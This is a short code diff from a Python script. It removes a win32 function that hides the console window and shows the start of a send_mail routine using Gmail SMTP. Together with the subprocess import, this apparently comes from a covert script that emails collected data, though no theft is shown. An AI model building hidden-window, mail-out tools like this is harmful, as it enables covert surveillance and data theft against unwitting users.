@@ -2,14 +2,6 @@ import requests
 import subprocess
 import smtplib
 import re
-# this import allows us to use winapi to hide the console
-import win32console, win32gui
-
-#hides console
-def consolehide():
-	wm = win32console.GetConsoleWindow()
-	win32gui.ShowWindow(wm, 0)
-
 
 def send_mail(email, password, message):
 	server = smtplib.SMTP("smtp.gmail.com", 587)
